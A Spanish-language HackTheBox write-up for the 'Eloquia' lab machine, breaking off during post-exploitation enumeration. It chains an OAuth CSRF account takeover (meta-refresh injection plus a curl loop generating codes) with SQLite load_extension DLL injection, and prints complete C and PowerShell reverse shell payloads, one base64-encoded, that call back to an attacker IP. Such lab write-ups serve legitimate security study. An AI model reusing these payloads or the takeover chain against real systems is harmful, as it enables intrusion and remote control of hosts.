---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Eloquia HackTheBox (Insane)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 11:00 CET
Nmap scan report for 10.10.11.99
Host is up (0.042s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eloquia.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
```

Veremos que hay un `WinRM` y una pagina web corriendo, tambien veremos que en la pagina nos lleva a un dominio llamado `eloquia.htb` el cual nos vamos añadir a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           eloquia.htb
```

Ahora vamos a entrar en dicho dominio.

```
URL = http://eloquia.htb/
```

Veremos una pagina web normal sin nada sospechoso aparentemente, pero si nos vamos al `login` y le damos a iniciar sesion por `Qooqle` veremos que nos redirije a un dominio nuevo llamado `qooqle.htb` el cual vamos añadir a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Detro del nano
<IP>           eloquia.htb qooqle.htb
```

Ahora si recargamos la pagina veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-15 124703.png" alt=""><figcaption></figcaption></figure>

Veremos que es una copia de `Google`, por lo que vamos a registrar un usuario normal a ver que nos encontramos por dentro, una vez registrado la cuenta veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-15 124809.png" alt=""><figcaption></figcaption></figure>

Ahora teniendo una cuenta de `Qooqle` vamos a registrar un usuario a parte en la pagina principal de `eloquia`, echo eso iniciaremos sesion y veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-15 125312.png" alt=""><figcaption></figcaption></figure>

Nos vamos donde pone `Connected Accounts` y veremos que podremos vincular nuestra cuenta de `Qooqle` a la de nuestro perfil de `eloquia`.

Cuando le demos a conectar, veremos que nos aparece esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-15 125401.png" alt=""><figcaption></figcaption></figure>

Le damos a `Authorize`, seguidamente se nos vinculara de forma correcta:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-15 125430.png" alt=""><figcaption></figcaption></figure>

## OAuth mediante CSRF y enlace de cuentas

### Generación de código OAuth

Despues de estar un buen rato investigando y analizando el comportamiento del `OAuth` junto con la cuenta de `eloquia` veremos que es bastante interesante cuando llega a esta peticion de cuando queremos vincular nuestra cuenta de `Qooquel` con la de `eloquia`.

```
POST /oauth2/authorize/?client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&response_type=code&redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/ HTTP/1.1
Host: qooqle.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://qooqle.htb/oauth2/authorize/?client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&response_type=code&redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/
Content-Type: application/x-www-form-urlencoded
Content-Length: 329
Origin: http://qooqle.htb
DNT: 1
Connection: keep-alive
Cookie: csrftoken=0ckMBLw655IFOg5LuuCLbYoDZxD3fQ2o; sessionid=1hxg0wlx5abs8hs2jjpuczjgkt6ri80q
Upgrade-Insecure-Requests: 1
Priority: u=0, i


csrfmiddlewaretoken=syikSEZyA4UmPTj8caDSfICm6sfHRDkUiAsWjfluvZsRtZeJwu5tgwQPVPIAWjc8&redirect_uri=http%3A%2F%2Feloquia.htb%2Faccounts%2Foauth2%2Fqooqle%2Fcallback%2F&scope=read+write&nonce=&client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&state=&response_type=code&code_challenge=&code_challenge_method=&claims=&allow=Authorize
```

Si esto lo mandamos al `repeater` y lo enviamos veremos esta respuesta del servidor:

```
HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=UQ5qq3YXArMS6DHlLl5wvrPgYJZsCe
Vary: Cookie
Cross-Origin-Opener-Policy: same-origin
Referrer-Policy: same-origin
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Powered-By: ARR/3.0
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Date: Mon, 15 Dec 2025 13:19:14 GMT
Content-Length: 0


```

Veremos que nos esta generando un `codigo` unico para la posible vinculacion de la cuenta

**Vulnerabilidades explotadas en esta petición:**

* **Falta de PKCE**: Los parámetros `code_challenge` y `code_challenge_method` están vacíos
* **Consentimiento automático**: Siempre se envía `allow=Authorize`
* **Reutilización de sesión**: Se usa una sesión activa válida repetidamente

El objetivo central de esta explotación es **engañar al sistema de OAuth** para que vincule **nuestra cuenta de Qooqle** (del atacante) con la **sesión activa de administrador** en Eloquia. Esto se logra mediante un ataque de CSRF en el flujo de autorización. Para ello tendremos que buscar de alguna forma que `admin` entre a dicha `URL` con nuestro codigo de vinculacion.

Veremos en la pagina web que podemos crear articulos dentro de un usuario autenticado desde la pagina principal en la opcion de `Manage My Articles` -> `Create Article`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-15 173714.png" alt=""><figcaption></figcaption></figure>

Aqui dentro le pondremos una imagen de prueba, en el `Title` pondremos lo que sea y en el `Rich Text Editor` pondremos la `URL` del atacante de forma que cuando entren les redirija de forma automatica a dicha `URL`.

```
<meta http-equiv="refresh" content="0;url=http://<IP_ATTACKER/">
```

> Alternativa `SCTI`

```
{{'<meta http-equiv="refresh" content="0;url=http://<IP_ATTACKER/>">'}}
```

Cuando le demos a `Publish Now` veremos que nos redirije de forma correcta a la `URL` que hemos puesto con la etiqueta `meta`, por lo que ya tenemos una via donde tendremos que hacer que `admin` entre a nuestro articulo para que sea redirigido a donde queramos.

#### Hacer que `admin` visite nuestro articulo

Investigando un poco vemos que en cada articulo hay un boton llamado `Report Article!` si le damos veremos el siguiente mensaje:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-16 105040.png" alt=""><figcaption></figcaption></figure>

Vemos que se envia al equipo de la web en el que puede estar el `admin` para visitar dicho articulo, pues lo que se nos ocurre con esto es reportar nuestro propio articulo para obligar a `admin` que visite nuestro articulo y sea redireccionado a la inyección que hemos puesto en el mismo.

### Explotación (Obtener acceso `admin`)

Para hacerlo mas simple abriremos un servidor de `python3` en nuestra maquina atacante sin nada dentro en un principio.

```shell
python3 -m http.server 80
```

Vamos a crear un articulo con el siguiente texto.

```
{{'<meta http-equiv="refresh" content="0;url=http://<IP_ATTACKER>/index.html">'}}
```

Le daremos a crear articulo con esa simple linea, una vez creado nos redireccionara al servidor de `python3` que tenemos levantado, pero no habra nada en su interior, pero vemos que la redireccion funciona.

Ahora vamos a crear este pequeño `HTML` para que cuando le demos a reportar el articulo le lleve a nuestro servidor y a la vez le redireccione al `HTML` que tendra la `URL` del codigo que vinculara nuestra cuenta.

> index.html

```html
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=<CODE>">
</head>
<body>
    <p>Redirigiendo...</p>
</body>
</html>
```

Esto tendra que estar en el mismo directorio que el servidor de `python3`.

### Generación continua de códigos OAuth

Comando `Oneline` que genera continuamente códigos de autorización válidos:

```shell
while true ; do
  curl -s -i -X POST 'http://qooqle.htb/oauth2/authorize/?client_id=<CLIENT_ID>&response_type=code&redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/' \
    -b "csrftoken=<TOKEN>; sessionid=<SESSION_ID>" \
    -d "csrfmiddlewaretoken=<TOKEN_SESSION>&redirect_uri=http%3A%2F%2Feloquia.htb%2Faccounts%2Foauth2%2Fqooqle%2Fcallback%2F&scope=read+write&nonce=&client_id=<CLIENT_ID>&state=&response_type=code&code_challenge=&code_challenge_method=&claims=&allow=Authorize" | tr -d '\r' | grep -oP 'Location: \K.*' | \
    xargs -I{} echo "<html><script>document.location='{}'</script></html>" | tee index.html ; sleep 5
done
```

**¿Qué hace exactamente este script?**

* Realiza peticiones POST cada 5 segundos al endpoint `/oauth2/authorize/` de qooqle.htb
* Utiliza credenciales de sesión válidas (`sessionid=<SESSION_ID>`)
* Siempre envía `allow=Authorize` para auto-aceptar la autorización
* Captura el header `Location` que contiene la URL de redirección con el código
* Genera un archivo `index.html` con JavaScript que redirige automáticamente

Una vez echo eso vamos a darle al boton de `reportar` de nuestro propio articulo que es donde tenemos echa la redireccion, pero si entramos en el articulo nos va a redireccionar, por lo que vamos a capturar la peticion de un boton de `reportar`:

```
GET /article/report/108/ HTTP/1.1
Host: eloquia.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://eloquia.htb/article/visit/1/
DNT: 1
Connection: keep-alive
Cookie: csrftoken=mVH5oX49oOWr4qO9I9mylVL0HEDmZTLJ
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Y cambiaremos el numero del articulo por el que sea de nuestra redireccion que hemos creado, en mi caso se le asigno el numero `108`.

#### **Cuando el admin visita el artículo**, ocurre:

Se redirige al servidor atacante El `index.html` con código fresco redirige a la callback de OAuth Se vincula la cuenta del atacante al admin

Despues de esperar un rato veremos lo siguiente en el servidor de `python3`.

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.99 - - [16/Dec/2025 11:29:06] "GET /index.html HTTP/1.1" 200 -
```

Veremos que ha funcionado, por lo que vamos a iniciar sesion mediante la cuenta de `Qooqle`, echo esto veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-16 120249.png" alt=""><figcaption></figcaption></figure>

## DLL Injection (RCE)

Veremos que seremos `admin`, por lo que iremos al `Admin Panel` que vemos en el menu hamburguesa, dentro del mismo veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-16 121538.png" alt=""><figcaption></figcaption></figure>

Le daremos al boton que pone `View on site` esto nos llevara a esta pagina de `SQL`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-16 121557.png" alt=""><figcaption></figcaption></figure>

Veremos que podremos meter codigo `SQL` desde la pagina y ejecutarlo para visualizarlo, investigando un poco si hacemos lo siguiente:

```mysql
SELECT * FROM explorer_query;
```

Info:

```
test 	SELECT load_extension('static\assets\images\blog\sqlite_shell.dll'); 		Dec. 16, 2025, 8:13 a.m. 	Dec. 16, 2025, 9:46 a.m. 	None 	False 		1 	False
2 	sqlquery 	SELECT load_extension('static\assets\images\blog\sqlite_shell.dll'); 		Dec. 16, 2025, 9:11 a.m. 	Dec. 16, 2025, 9:14 a.m. 	None 	False 		1 	False
3 	Playground Query 	SELECT load_extension('static\assets\images\blog\sqlite_shell.dll'); 		Dec. 16, 2025, 9:17 a.m. 	Dec. 16, 2025, 9:17 a.m. 	1 	False 		1 	False
4 	query 	SELECT * FROM explorer_query; 		Dec. 16, 2025, 9:42 a.m. 	Dec. 16, 2025, 11:07 a.m. 	None 	False 		1 	False
5 	test2 	SELECT load_extension('static\assets\images\blog\sqlite_shell.dll'); 		Dec. 16, 2025, 10:04 a.m. 	Dec. 16, 2025, 10:07 a.m. 	None 	False 		1 	False
6 	pwd 	PRAGMA database_list; 	pwd 	Dec. 16, 2025, 10:12 a.m. 	Dec. 16, 2025, 10:33 a.m. 	1 	False 	
```

Veremos informacion de los usuarios que estan ejecutando tambien codigo, guiandome por esto veremos que intentan acceder a una `.dll` que tendra un codigo de `reverse shell`, por lo que vamos a investigar por esa via.

```mysql
SELECT load_extension('static\assets\images\blog\sqlite_shell.dll');
```

Investigando este comando que encontre, vemos que esta inyectando una `DLL` sustituyendo desde `admin` la imagen de un articulo por un archivo de `DLL`, y esto se puede ver de esta forma.

Si nos metemos en cualquier articulo como `admin`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-16 121430 (1).png" alt=""><figcaption></figcaption></figure>

Veremos que tiene la misma ruta de imagen, por lo que vamos a entrar en cualquier articulo y sustituiremos la imagen que este subida por nuestro archivo `.dll` que contenga una `reverse shell` hacia el servidor para ejecutarlo desde la pagina de `SQL` cargando el mismo.

> evil.c

```c
// revshell.c - Versión para cross-compilar (Linux)
#include <windows.h>
#include <process.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Comando para ejecutar (reverse shell)
        char cmd[] = "powershell -nop -exec bypass -c \"$client = New-Object System.Net.Sockets.TCPClient('<IP_ATTACKER>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";

        // Ejecutar
        WinExec(cmd, SW_HIDE);
    }
    return TRUE;
}
```

Ahora vamos a compilarlo de esta forma:

```shell
# Instalar dependencias
sudo apt-get install mingw-w64

# Para 64-bit (RECOMENDADA)
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c -lws2_32 

# Para 32-bit
i686-w64-mingw32-gcc -shared -o evil.dll evil.c -lws2_32
```

En mi caso utilizare la de `64 bits`, una vez que lo hayamos compilado, vamos a cargarla en la imagen de un articulo desde el panel de `admin`, ya que podemos modificar imagenes quedando asi:

<figure><img src="../../.gitbook/assets/Pasted image 20251216123531.png" alt=""><figcaption></figcaption></figure>

Ahora desde la pagina `SQL` vamos a lanzar el siguiente comando, pero antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y enviamos desde la pagina este comando...

```mysql
SELECT load_extension('static\assets\images\blog\evil.dll');
```

> Custom Shell mediante DLL Injection

Pude crear una `shell` custom para realizar todo este proceso mas automatizado que tengo subido en mi repositorio de `GitHub`.

URL = [GitHub Shell Custom DLL Injection HTB Eloquia](https://github.com/D1se0/Eloquia-DLL-Injection-Exploit-HTB)

Se habra cargado bien, pero no obtendremos una `shell` vamos a probar a escribir el output de algun comando en un `.txt` y subirlo a la pagina en la ruta de `static\assets\images\blog\` de esta forma:

## Escalate user web

### Escribir TXT en la pagina con DLL Injection

```c
// list_desktop.dll - Lista Desktop y guarda en .txt
#include <windows.h>
#include <stdio.h>
#include <time.h>

__declspec(dllexport) int sqlite3_extension_init() {
    // 1. Primero crear logs básicos
    time_t t = time(NULL);
    struct tm* tm_info = localtime(&t);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);

    // 2. Comandos para listar Desktop
    const char* commands[] = {
        // Listar Desktop actual
        "dir %USERPROFILE%\\Desktop",

        // Listar con detalles
        "dir %USERPROFILE%\\Desktop /a /s",

        // Listar todos los Desktops de usuarios
        "dir C:\\Users\\*\\Desktop 2>nul",

        // Buscar archivos interesantes
        "dir %USERPROFILE%\\Desktop\\*.txt *.pdf *.doc* *.xls* 2>nul",

        // Información del usuario
        "whoami && echo. && echo Desktop: %USERPROFILE%\\Desktop"
    };

    // 3. Ejecutar cada comando y guardar output
    char cmd[1024];
    char output_file[512];

    for(int i = 0; i < 5; i++) {
        // Crear nombre de archivo único
        snprintf(output_file, sizeof(output_file),
                 "static\\assets\\images\\blog\\desktop_output_%d.txt", i);

        // Construir comando para redirigir output a archivo
        snprintf(cmd, sizeof(cmd),
                 "cmd /c %s > \"%s\" 2>&1",
                 commands[i], output_file);

        // Ejecutar
        system(cmd);

        // Añadir timestamp al archivo
        FILE* fp = fopen(output_file, "a");
        if(fp) {
            fprintf(fp, "\n\n[Generated at: %s - Command: %s]\n",
                    timestamp, commands[i]);
            fclose(fp);
        }
    }

    // 4. Comando PowerShell más avanzado
    const char* ps_cmd =
        "powershell -c \""
        "$desktop = [Environment]::GetFolderPath('Desktop'); "
        "'=== DESKTOP LISTING ===' | Out-File 'static\\assets\\images\\blog\\ps_desktop.txt'; "
        "'Desktop Path: ' + $desktop | Out-File 'static\\assets\\images\\blog\\ps_desktop.txt' -Append; "
        "'User: ' + $env:USERNAME | Out-File 'static\\assets\\images\\blog\\ps_desktop.txt' -Append; "
        "'Time: ' + (Get-Date) | Out-File 'static\\assets\\images\\blog\\ps_desktop.txt' -Append; "
        "Get-ChildItem $desktop -Force | Format-List | Out-File 'static\\assets\\images\\blog\\ps_desktop.txt' -Append; "
        "'=== FILE DETAILS ===' | Out-File 'static\\assets\\images\\blog\\ps_desktop.txt' -Append; "
        "Get-ChildItem $desktop -Recurse -ErrorAction SilentlyContinue | Select-Object Name,Length,LastWriteTime | Out-File 'static\\assets\\images\\blog\\ps_desktop.txt' -Append\"";

    WinExec(ps_cmd, SW_HIDE);

    // 5. También buscar en otros usuarios
    system("cmd /c dir C:\\Users\\ /b > static\\assets\\images\\blog\\users.txt");

    // 6. Crear resumen
    FILE* summary = fopen("static\\assets\\images\\blog\\summary.txt", "w");
    if(summary) {
        fprintf(summary, "Desktop Enumeration Report\n");
        fprintf(summary, "==========================\n");
        fprintf(summary, "Timestamp: %s\n", timestamp);
        fprintf(summary, "\nGenerated files:\n");
        fprintf(summary, "- desktop_output_0.txt: Basic Desktop listing\n");
        fprintf(summary, "- desktop_output_1.txt: Detailed Desktop listing\n");
        fprintf(summary, "- desktop_output_2.txt: All users Desktops\n");
        fprintf(summary, "- desktop_output_3.txt: Interesting files\n");
        fprintf(summary, "- desktop_output_4.txt: User info\n");
        fprintf(summary, "- ps_desktop.txt: PowerShell detailed listing\n");
        fprintf(summary, "- users.txt: List of system users\n");
        fprintf(summary, "\nAccess via: http://[target]/static/assets/images/blog/[filename]\n");
        fclose(summary);
    }

    // 7. Reverse shell opcional (en segundo plano)
    const char* revshell = "powershell -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADAALgAxADAALgAxADQALgAyADUAIgAsADcANwA3ADcAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJAByAD0AaQBlAHgAIAAkAGQAIAAyAD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwA7ACQAcgAyAD0AJAByACsAIgBQAFMAIAAiACsAWwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AUABhAHQAaABJAG4AZgBvAF0ALgBHAGUAdABQAHIAbwBwAGUAcgB0AHkAKAAiAFAAYQB0AGgAIgApAC4ARwBlAHQAVgBhAGwAdQBlACgAKABwAHcAZAApACkAKwAiAD4AIAAiADsAJABzAGIAPQBbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJAByADIAKQA7ACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkACgA=";

    char revshell_cmd[2048];
    snprintf(revshell_cmd, sizeof(revshell_cmd),
             "powershell -c \"Start-Sleep -Seconds 5; try { %s } catch { } \"",
             revshell);

    WinExec(revshell_cmd, SW_HIDE);

    return 0;
}
```

Probaremos hacer varias cosas a la vez, a ver si obtenemos informacion relevante.

```shell
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

Despues de haberlo compilado repetiremos el mismo proceso de subirlo desde el panel de `admin` a una imagen de un articulo la `DLL` y desde el `SQL` de la pagina lo cargaremos:

```mysql
SELECT load_extension('static\assets\images\blog\evil.dll');
```

Veremos que se cargo de forma correcta, ahora si por ejemplo navegamos a esta parte de la pagina:

```
URL = http://eloquia.htb/static/assets/images/blog/desktop_output_0.txt
```

Info:

```
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users\web\Desktop

10/21/2025  01:23 PM    <DIR>          .
10/21/2025  01:23 PM    <DIR>          ..
12/15/2025  08:01 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,197,138,432 bytes free


[Generated at: 2025-12-16 05:01:45 - Command: dir %USERPROFILE%\Desktop]
```

Veremos que los comandos se estan ejecutando bien y a parte se esta escribiendo el `.txt` con la info de los comandos, por lo que vamos a leer la `flag` del usuario de esta forma:

```c
// read_exact_user.dll - Lee user.txt de ruta específica
#include <windows.h>

__declspec(dllexport) int sqlite3_extension_init() {
    // Ruta exacta: C:\Users\web\Desktop\user.txt
    system("cmd /c type \"C:\\Users\\web\\Desktop\\user.txt\" > static\\assets\\images\\blog\\flag.txt");

    return 0;
}
```

Lo compilamos:

```shell
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

Repetimos el mismo proceso de subir la `DLL` y ejecutamos la misma:

```mysql
SELECT load_extension('static\assets\images\blog\evil.dll');
```

Ahora si viajamos a la `URL` del archivo que se ha tenido que crear...

```
URL = http://eloquia.htb/static/assets/images/blog/flag.txt
```

Info:

```
90fd70a9ef9a1a3550ff59566342ec33
```

Veremos que ha funcionado, por lo que tendremos la `flag` del usuario.

> user.txt

```
90fd70a9ef9a1a3550ff59566342ec33
```

Ahora tendremos que investigar mas a fondo como obtener acceso a la maquina mediante esta vulnerabilidad.

#### Reverse shell por medio de DLL

Despues de muchas horas encontre la clave para establecer una `shell` al servidor, utilizamos llamadas a la API estándar de `Win32` (`WSASocket, CreateProcess`) para generar `cmd.exe` y tunelizar la entrada/salida a través de un `socket TCP`.

Vamos a crearnos la siguiente `DLL`.

> rev.c

```c
// sqlite_revshell.c - Reverse Shell DLL para SQLite load_extension
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

// Configuración de la reverse shell
#define RHOST "<IP_ATTACKER>"
#define RPORT <PORT>

// Función para crear la reverse shell
int CreateReverseShell() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmd[] = "cmd.exe";

    // Inicializar Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    // Crear socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Configurar dirección del atacante
    addr.sin_family = AF_INET;
    addr.sin_port = htons(RPORT);
    addr.sin_addr.s_addr = inet_addr(RHOST);

    // Conectar al atacante
    if (WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Configurar la estructura STARTUPINFO para redirigir entrada/salida
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    si.wShowWindow = SW_HIDE;

    // Crear proceso cmd.exe
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(
        NULL,           // No module name (use command line)
        cmd,            // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        TRUE,           // Set handle inheritance to TRUE (para redirigir std handles)
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory
        &si,            // Pointer to STARTUPINFO structure
        &pi             // Pointer to PROCESS_INFORMATION structure
    )) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Esperar a que el proceso termine (nunca debería, a menos que se cierre la conexión)
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Limpiar
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}

// Versión alternativa usando threads para que no se bloquee
DWORD WINAPI ReverseShellThread(LPVOID lpParam) {
    CreateReverseShell();
    return 0;
}

// Función de exportación para SQLite
__declspec(dllexport) int sqlite3_extension_init(void) {
    HANDLE hThread;

    // Crear thread para la reverse shell (no bloqueante)
    hThread = CreateThread(
        NULL,                   // Default security attributes
        0,                      // Default stack size
        ReverseShellThread,     // Thread function
        NULL,                   // Parameter to thread function
        0,                      // Default creation flags
        NULL                    // Receives thread identifier
    );

    if (hThread != NULL) {
        CloseHandle(hThread);  // No necesitamos el handle
    }

    return 0;  // Éxito
}

// Punto de entrada de la DLL (opcional)
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Puedes iniciar la shell aquí si prefieres
            // CreateThread(NULL, 0, ReverseShellThread, NULL, 0, NULL);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

Vamos a compilarlo de esta forma:

```shell
x86_64-w64-mingw32-gcc -shared -o rev.dll rev.c -lws2_32 -s -Os
```

Ahora vamos a realizar el mismo proceso anterior de subir la `.dll` a una imagen de un articulo y desde el `SQL Explorer` vamos a cargar dicha `DLL`, pero antes nos pondremos a la escucha.

```shell
nc -lvnp <PORT>
```

Y ahora si ejecutamos lo siguiente...

```shell
SELECT load_extension('static\assets\images\blog\rev.dll');
```

Volvemos a donde tenemos la escucha y veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.99] 50286
Microsoft Windows [Version 10.0.17763.8027]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Web\Eloquia>whoami
whoami
eloquia\web
```

Vemos que ha funcionado, por lo que habremos obtenido una `shell` como el usuario `web`.

## Escalate user Olivia.KAT

Si listamos la `home` del usuario `web` veremos lo siguiente:

```
Directory of C:\Users\web

10/22/2025  12:31 PM    <DIR>          .
10/22/2025  12:31 PM    <DIR>          ..
04/16/2024  08:17 AM    <DIR>          .cache
10/22/2025  12:34 PM    <DIR>          .idlerc
10/21/2025  01:23 PM    <DIR>          3D Objects
10/21/2025  01:23 PM    <DIR>          Contacts
10/21/2025  01:23 PM    <DIR>          Desktop
10/21/2025  01:23 PM    <DIR>          Documents
10/21/2025  01:23 PM    <DIR>          Downloads
10/21/2025  01:23 PM    <DIR>          Favorites
10/21/2025  01:23 PM    <DIR>          Links
10/21/2025  01:23 PM    <DIR>          Music
10/21/2025  01:23 PM    <DIR>          Pictures
10/21/2025  01:23 PM    <DIR>          Saved Games
10/21/2025  01:23 PM    <DIR>          Searches
10/21/2025  01:23 PM    <DIR>          Videos
               0 File(s)              0 bytes
              16 Dir(s)   4,544,323,584 bytes free
```

Vemos bastante interesante los archivos llamados `.cache` y `.idlerc`.

`.cache`

* **Google Chrome/Edge**: `C:\Users\web\.cache\` no es la ruta estándar para cache de navegadores en Windows (normalmente estaría en `AppData`).
* **Posibilidades**: Podría ser cache de aplicaciones Python, Firefox (a veces usa .cache en algunos sistemas), u otras herramientas.

`.idlerc`

* Este es **100% el directorio de configuración de IDLE** (el editor de Python).
* Contiene configuraciones, historial, y posiblemente archivos temporales de IDLE.

Sabiendo esto vamos a investigar la carpeta de `Microsoft` donde se aloja la informacion de las sesiones de los navegadores en parte de su informacion.

```cmd
dir C:\Users\web\AppData\Local\Microsoft
```

Info:

```
04/20/2025  07:24 PM    <DIR>          .
04/20/2025  07:24 PM    <DIR>          ..
04/20/2024  11:10 AM    <DIR>          Edge
04/19/2024  04:53 PM    <DIR>          Feeds
04/19/2024  04:53 PM    <DIR>          input
09/14/2018  11:19 PM    <DIR>          InputPersonalization
10/21/2025  01:23 PM    <DIR>          Internet Explorer
04/19/2024  04:53 PM    <DIR>          Media Player
04/20/2025  07:24 PM    <DIR>          PenWorkspace
04/19/2024  04:53 PM    <DIR>          PlayReady
04/20/2024  11:11 AM    <DIR>          TokenBroker
